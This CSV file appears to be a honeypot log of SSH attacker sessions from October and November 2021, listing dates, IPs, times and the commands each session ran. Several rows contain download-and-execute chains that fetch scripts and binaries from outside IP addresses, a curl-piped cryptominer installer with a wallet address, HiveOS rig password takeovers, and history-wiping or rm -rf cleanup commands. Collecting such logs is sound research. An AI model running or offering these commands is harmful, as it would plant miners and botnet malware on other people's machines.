attackdate,attackerip,entrancetime,exittime,commands
2021-10-28,10.0.3.117,23:56:16.512,23:56:27.406,"['sudo hive-passwd dayone1edfjqiyhnh1', 'sudo pkill Xorg']"
2021-10-31,10.0.3.173,23:38:26.595,23:49:27.137,['scp -t /tmp/DUGIPEoI']
2021-11-08,10.0.3.92,23:57:34.371,23:58:35.431,[]
2021-11-08,10.0.3.228,00:15:52.840,00:16:11.307,['scp -t /tmp/4hMLMXSk']
2021-10-29,10.0.3.81,00:53:47.658,00:55:48.675,['curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA']
2021-10-31,10.0.3.36,00:51:04.503,00:56:44.303,"['cd /tmp || cd /var/run || cd /mnt || cd /root || cd /', 'wget http://159.65.125.126/jewn.sh', 'curl -O http://159.65.125.126/jewn.sh', 'chmod 777 jewn.sh', 'sh jewn.sh', 'tftp 159.65.125.126 -c get jewn.sh', 'chmod 777 jewn.sh', 'sh jewn.sh', 'tftp -r jewn2.sh -g 159.65.125.126', 'chmod 777 jewn2.sh', 'sh jewn2.sh', 'ftpget -v -u anonymous -p anonymous -P 21 159.65.125.126 jewn1.sh jewn1.sh', 'sh jewn1.sh', 'rm -rf jewn.sh jewn.sh jewn2.sh jewn1.sh', 'rm -rf *']"
2021-11-05,10.0.3.251,01:06:14.710,01:07:36.895,['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdvbase64']
2021-10-29,10.0.3.32,01:08:50.118,01:08:52.058,[]
2021-11-09,10.0.3.23,01:42:24.719,01:42:47.440,['scp -t /tmp/P802v3oS']
2021-10-29,10.0.3.59,02:27:08.252,02:40:06.100,[]
2021-10-31,10.0.3.63,02:45:48.250,02:45:55.441,['uname -a']
2021-11-08,10.0.3.7,02:47:03.670,02:47:26.672,['scp -t /tmp/nbnV3Aga']
2021-10-29,10.0.3.224,03:17:02.416,03:30:01.804,"['sudo hive-passwd dayone1edfjqiyhnh1', 'sudo pkill Xorg']"
2021-11-03,10.0.3.213,04:29:33.184,04:29:56.000,['scp -t /tmp/yEE8I23z']
2021-11-08,10.0.3.234,04:46:24.777,04:46:44.662,['scp -t /tmp/YWgB6Eqb']
2021-10-29,10.0.3.209,05:10:10.156,05:51:53.670,"['sudo hive-passwd dayone1edfjqiyhnh3', 'sudo pkill Xorg', 'uname -a']"
2021-11-04,10.0.3.46,05:46:19.118,05:48:15.275,[]
2021-11-07,10.0.3.245,06:17:32.152,06:17:41.964,['/ip cloud print']
2021-10-29,10.0.3.35,06:09:52.410,06:48:04.190,[]
2021-11-10,10.0.3.236,06:54:06.709,06:54:28.835,['scp -t /tmp/nSL9ejn8']
2021-10-29,10.0.3.158,07:19:15.994,07:29:05.755,"['sudo hive-passwd dayone1edfjqiyhnh1', 'sudo pkill Xorg']"
2021-10-29,10.0.3.10,08:40:06.092,08:54:02.162,['scp -t /tmp/A0RCoaxJ']
2021-10-30,10.0.3.124,08:42:00.553,08:52:36.353,['cat /etc/issue']
2021-11-01,10.0.3.135,08:22:18.199,08:22:38.607,['scp -t /tmp/6yzQx9gV']
2021-10-29,10.0.3.129,09:15:54.630,09:46:26.173,"['sudo hive-passwd dayone1edfjqiyhnh3', 'sudo pkill Xorg', 'uname -a']"
2021-10-31,10.0.3.18,09:31:56.341,09:42:14.189,['/ip cloud print']
2021-10-29,10.0.3.216,10:24:43.973,10:47:55.176,[]
2021-10-30,10.0.3.161,10:26:52.031,10:30:14.060,[]
2021-11-01,10.0.3.89,10:53:36.248,10:59:42.201,['scp -t /tmp/a4zvuons']
2021-11-05,10.0.3.183,11:11:54.532,11:12:24.157,['scp -t /tmp/XrPWra3b']
2021-10-29,10.0.3.169,11:12:34.367,11:32:48.480,[]
2021-10-31,10.0.3.253,11:21:30.337,11:27:04.522,"['sudo hive-passwd dayonef1edfujqicyhnyh1okugyllus12', 'cat /hive-config/rig.conf']"
2021-11-01,10.0.3.149,11:39:58.166,11:57:29.097,['nproc']
2021-10-29,10.0.3.134,12:32:49.914,12:32:51.815,[]
2021-10-30,10.0.3.63,12:39:28.653,12:53:43.562,['scp -t /tmp/cCFRxcn8']
2021-11-08,10.0.3.242,12:43:41.720,12:48:47.898,"['cat /etc/issue', 'cd /tmp/', 'rm -rf x86*', 'wget http://179.43.175.58/x86_64', 'chmod 777 *', './x86_64 x8666', 'echo Suck my dick.']"
2021-11-06,10.0.3.72,13:29:14.338,13:29:33.491,[]
2021-10-29,10.0.3.145,13:13:03.521,13:13:05.489,[]
2021-11-01,10.0.3.154,13:26:54.641,13:46:24.865,['scp -t /tmp/1mHUDiKv']
2021-10-30,10.0.3.123,14:28:49.200,14:40:05.603,[]
2021-11-08,10.0.3.173,14:39:50.069,14:40:09.699,['scp -t /tmp/68BCh1Ua']
2021-11-03,10.0.3.105,15:06:49.261,15:29:48.409,"['cd /tmp || cd /var/run || cd /mnt || cd /root || cd /', 'wget http://149.56.35.183/skidnet.sh', 'chmod 777 *', 'sh skidnet.sh', 'tftp -g 149.56.35.183 -r tftp1.sh', 'chmod 777 *', 'sh tftp1.sh', 'rm -rf *.sh', 'history -c']"
2021-11-10,10.0.3.239,15:26:28.032,15:27:07.628,['scp -t /tmp/iAprzOHH']
2021-10-29,10.0.3.66,15:31:21.054,15:31:47.192,['scp -t /tmp/7U30ibca']
2021-11-03,10.0.3.121,16:23:52.167,16:27:53.266,"['cat /etc/issue', 'cd /tmp/', 'rm -rf x86*', 'wget http://179.43.175.58/x86_64', 'chmod 777 *', './x86_64 x86', 'echo Molov be suckin theese dicks, accrobat acting like goofy']"
2021-11-05,10.0.3.93,16:03:35.281,16:04:49.469,[]
2021-10-28,10.0.3.72,16:48:17.674,16:50:55.583,"['sudo hive-passwd dayone1edfjqiyhnh3', 'sudo pkill Xorg', 'sudo pkill x11vnc', 'uname -a']"
2021-11-04,10.0.3.103,17:26:28.597,17:26:52.642,['scp -t /tmp/O8YwEWyH']
2021-10-30,10.0.3.224,17:12:22.036,17:49:52.823,"['sudo hive-passwd upu2B8Hed2dy8i6XYF7', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-10-31,10.0.3.86,17:11:44.106,17:12:03.945,['scp -t /tmp/qc3UrPyt']
2021-10-29,10.0.3.239,18:51:41.769,18:51:58.976,['scp -t /tmp/tg2qzJJF']
